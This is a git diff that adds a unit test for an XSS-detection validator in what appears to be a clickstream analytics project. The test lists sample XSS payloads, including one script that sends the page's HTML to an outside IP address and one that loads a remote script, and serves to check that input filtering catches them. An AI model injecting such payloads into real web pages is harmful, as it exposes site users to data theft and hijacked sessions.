@@ -27,7 +27,7 @@ import {
   S3_PATH_PLUGIN_FILES_PATTERN,
   SECRETS_MANAGER_ARN_PATTERN,
 } from '../../common/constants-ln';
-import { validateDataProcessingInterval, validatePattern, validateSinkBatch } from '../../common/stack-params-valid';
+import { validateDataProcessingInterval, validatePattern, validateSinkBatch, validateXSS } from '../../common/stack-params-valid';
 import { ClickStreamBadRequestError, PipelineSinkType } from '../../common/types';
 import { containRule, isEmpty } from '../../common/utils';
 
@@ -600,6 +600,26 @@ describe('Network test', () => {
       'rate(5 minutes)',
     ];
     invalidValues.forEach(v => expect(() => validateDataProcessingInterval(v)).toThrow(ClickStreamBadRequestError));
+  });
+
+  it('Validate XSS', async () => {
+    const validValues = [
+      '><svg onload=alert(1)>',
+      '<svg onload=alert(1)>',
+      '<script>new Image().src="https://192.165.159.122/ fakepg.php?output="+document.body.innerHTML</script>',
+      '<script src="https://192.165.159.122/xss.js">',
+      '<img src =q onerror=prompt(8)>',
+      '<%= 3 * 3 %>',
+      '<IMG SRC=javascript:alert(\'XSS\')>',
+    ];
+    validValues.forEach(v => expect(validateXSS(v)).toEqual(true));
+    const invalidValues = [
+      '',
+      '中文',
+      'asdasdsfASDSADSAD',
+      'sadasjkjdfsh-sdasd_sadsad',
+    ];
+    invalidValues.forEach(v => expect(validateXSS(v)).toEqual(false));
   });
 
 });
